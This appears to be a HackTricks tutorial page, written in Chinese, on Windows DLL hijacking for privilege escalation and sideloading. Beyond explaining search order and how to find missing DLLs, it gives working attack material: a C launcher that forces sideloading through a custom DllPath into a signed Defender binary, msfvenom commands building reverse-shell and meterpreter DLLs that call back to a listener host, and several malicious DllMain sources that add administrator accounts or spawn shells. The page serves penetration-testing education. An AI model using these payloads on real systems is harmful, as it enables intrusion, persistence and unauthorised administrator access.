# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}



## 基本信息

DLL Hijacking 涉及操纵受信任的应用程序去加载恶意 DLL。这个术语包含若干策略，例如 **DLL Spoofing, Injection, and Side-Loading**。它主要用于代码执行、持久化，以及较少用于权限提升。尽管此处关注提升权限，劫持的方法在不同目标之间基本一致。

### 常见技术

针对 DLL hijacking 有几种方法，根据应用程序的 DLL 加载策略，各方法的有效性不同：

1. **DLL Replacement**：用恶意 DLL 替换真实 DLL，可选择使用 DLL Proxying 保留原始 DLL 的功能。
2. **DLL Search Order Hijacking**：将恶意 DLL 放置在合法 DLL 之前的搜索路径中，利用应用的搜索模式。
3. **Phantom DLL Hijacking**：为应用创建一个恶意 DLL，使其以为这是一个不存在但需要的 DLL 并加载它。
4. **DLL Redirection**：修改搜索参数，例如 %PATH% 或 .exe.manifest / .exe.local 文件，以指向恶意 DLL。
5. **WinSxS DLL Replacement**：在 WinSxS 目录中将合法 DLL 替换为恶意版本，这种方法通常与 DLL side-loading 相关。
6. **Relative Path DLL Hijacking**：将恶意 DLL 放在用户可控目录中并复制应用程序，类似 Binary Proxy Execution 技术。

## 查找缺失的 Dlls

在系统内查找缺失 DLLs 最常见的方法是运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)（来自 sysinternals），并**设置以下 2 个过滤器**：

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

并且仅显示 **File System Activity**：

![](<../../images/image (314).png>)

如果你是在查找**通用的缺失 dlls**，就让它运行几**秒钟**。\
如果你是在查找**特定可执行文件内的缺失 dll**，你应该设置另一个过滤器，比如 "Process Name" "contains" "\<exec name>"，执行它，然后停止捕获事件。

## 利用缺失的 Dlls

为了提升权限，我们最好的机会是能**写入一个特权进程会尝试加载的 dll**到某个**会被搜索**的位置。因此，我们可以将 dll 写入一个**在原始 dll 所在文件夹之前被搜索到的文件夹**（罕见情况），或者写入某个**将被搜索但原始 dll 在任何文件夹中都不存在**的文件夹。

### Dll 搜索顺序

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows 应用程序按一组预定义的搜索路径查找 DLLs，遵循特定顺序。当恶意 DLL 被策略性地放置在这些目录之一，确保其比真实 DLL 更先被加载时，就会发生 DLL hijacking。防止此类问题的一种方法是确保应用在引用所需 DLL 时使用绝对路径。

你可以在下面看到 32-bit 系统上的 DLL 搜索顺序：

1. 应用程序加载的目录。
2. 系统目录。使用 [GetSystemDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 函数获取此目录的路径。(_C:\Windows\System32_)
3. 16-bit 系统目录。没有函数可以获取此目录的路径，但它会被搜索。(_C:\Windows\System_)
4. Windows 目录。使用 [GetWindowsDirectory](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 函数获取此目录的路径。
1. (_C:\Windows_)
5. 当前目录。
6. 在 PATH 环境变量中列出的目录。注意：这不包括由 **App Paths** 注册表键指定的每个应用程序路径。计算 DLL 搜索路径时不使用 **App Paths** 键。

这是启用 **SafeDllSearchMode** 时的**默认**搜索顺序。当其被禁用时，当前目录会上升到第二位。要禁用此功能，请创建注册表值 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode** 并将其设置为 0（默认启用）。

如果以 **LOAD_WITH_ALTERED_SEARCH_PATH** 调用 [LoadLibraryEx](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数，则搜索将从 LoadLibraryEx 正在加载的可执行模块的目录开始。

最后，注意可以通过指示绝对路径而不是仅提供名称来加载一个 dll。在那种情况下，该 dll **只会在该路径中被搜索**（如果该 dll 有任何依赖项，它们将像按名称加载的一样被搜索）。

还有其他方法可以改变搜索顺序，但这里不再详细说明。

### 通过 RTL_USER_PROCESS_PARAMETERS.DllPath 强制 sideloading

一种高级且可确定性地影响新创建进程 DLL 搜索路径的方法是，在使用 ntdll 的原生 API 创建进程时，在 RTL_USER_PROCESS_PARAMETERS 中设置 DllPath 字段。通过在此处提供一个由攻击者控制的目录，当目标进程按名称解析导入的 DLL（未使用绝对路径且未使用安全加载标志）时，可以被迫从该目录加载恶意 DLL。

关键思路
- 使用 RtlCreateProcessParametersEx 构建进程参数，并提供一个指向你控制文件夹（例如你的 dropper/unpacker 所在目录）的自定义 DllPath。
- 使用 RtlCreateUserProcess 创建进程。当目标二进制按名称解析 DLL 时，加载器将在解析过程中查看所提供的 DllPath，从而即使恶意 DLL 未与目标 EXE 同处一处，也能实现可靠的 sideloading。

注意/限制
- 这只影响被创建的子进程；它不同于 SetDllDirectory，后者仅影响当前进程。
- 目标必须按名称导入或通过 LoadLibrary 来加载 DLL（未使用绝对路径且未使用 LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）。
- KnownDLLs 和硬编码的绝对路径无法被劫持。转发导出和 SxS 可能改变先后顺序。

最小 C 示例（ntdll，宽字符串，简化错误处理）：
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
实战使用示例
- 将恶意 xmllite.dll（导出所需函数或代理到真实版本）放置在你的 DllPath 目录中。
- 根据上述方法，启动一个已签名且已知按名称查找 xmllite.dll 的二进制文件。加载器通过提供的 DllPath 解析导入并 sideloads your DLL。

该技术已在实战中被观察到用于驱动多阶段 sideloading 链：初始启动器放置一个辅助 DLL，然后生成一个 Microsoft-signed、hijackable 的二进制，并使用自定义 DllPath 强制从暂存目录加载攻击者的 DLL。


#### Exceptions on dll search order from Windows docs

Windows 文档中指出了对标准 DLL 搜索顺序的若干例外情况：

- 当遇到一个 **与内存中已加载的 DLL 同名的 DLL** 时，系统会绕过通常的搜索。系统会先检查重定向和清单，然后才回退到内存中已加载的 DLL。**在这种情况下，系统不会对该 DLL 进行搜索**。
- 在 DLL 被识别为当前 Windows 版本的 **known DLL** 的情况下，系统将使用其 own 版本的 known DLL 及其任何依赖 DLL，**放弃搜索过程**。注册表键 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 保存了这些 known DLL 的列表。
- 如果一个 **DLL 有依赖项**，则对这些依赖 DLL 的搜索将按它们仅由 **模块名** 指示的方式进行，无论初始 DLL 是否通过完整路径标识。

### 提权

**要求**：

- 识别一个以或将以 **不同权限**（horizontal or lateral movement）运行的进程，该进程 **缺少 DLL**。
- 确保对将要搜索该 **DLL** 的任意 **目录** 拥有 **写访问权限**。该位置可能是可执行文件的目录，或系统路径中的某个目录。

是的，要满足这些前提很难：**默认情况下，很难发现缺少 DLL 的有特权的可执行文件**，而且 **默认情况下在系统路径文件夹具有写权限更是不太可能**（你默认不能）。但在配置错误的环境中这确实可能发生。\
如果你幸运地满足这些条件，可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即便该项目的 **主要目标是绕过 UAC**，你也可能在其中找到适用于目标 Windows 版本的 **PoC**，用以实现 Dll hijaking（可能只需更改你有写权限的文件夹路径）。

请注意，你可以通过以下方式**检查某个文件夹的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并 **检查 PATH 中所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
你也可以使用以下命令检查可执行文件的 imports 和 dll 的 exports：
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
要获取关于如何在具有写入 **System Path folder** 权限时 **abuse Dll Hijacking to escalate privileges** 的完整指南，请查看：

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### 自动化工具

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) 将检查你是否对 system PATH 中的任何文件夹具有写入权限。\
其他用于发现该漏洞的有趣自动化工具包括 **PowerSploit functions**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_ 和 _Write-HijackDll_。

### 示例

如果你发现可利用的场景，成功利用它的最重要事项之一是 **create a dll that exports at least all the functions the executable will import from it**。另外，请注意 Dll Hijacking 在以下方面非常有用：从 [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) 或者从 [**High Integrity to SYSTEM**](#from-high-integrity-to-system)。你可以在这个专注于 dll hijacking 用于执行的研究中找到一个关于 **how to create a valid dll** 的示例： [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
此外，在 **下一节** 中你可以找到一些 **basic dll codes**，这些可能作为模板有用，或用于创建一个导出非必需函数的 **dll**。

## **创建并编译 Dlls**

### **Dll Proxifying**

基本上，**Dll proxy** 是一种在被加载时能够执行你恶意代码的 dll，同时也会将所有调用转发给真实库，从而作为预期的库被暴露并正常工作。

使用工具 [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 或 [**Spartacus**](https://github.com/Accenture/Spartacus)，你可以指定一个可执行文件并选择要 proxify 的库，生成一个 proxified dll，或者直接指定该 Dll 并生成一个 proxified dll。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取一个 meterpreter (x86)：**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建一个用户（x86，我没有看到 x64 版本）：**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己的

注意，在很多情况下，你编译的 Dll 必须 **导出若干函数**，这些函数会被 victim process 加载；如果这些函数不存在，**binary 无法加载** 它们，且 **exploit 将失败**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## 参考资料

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)



- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../banners/hacktricks-training.md}}
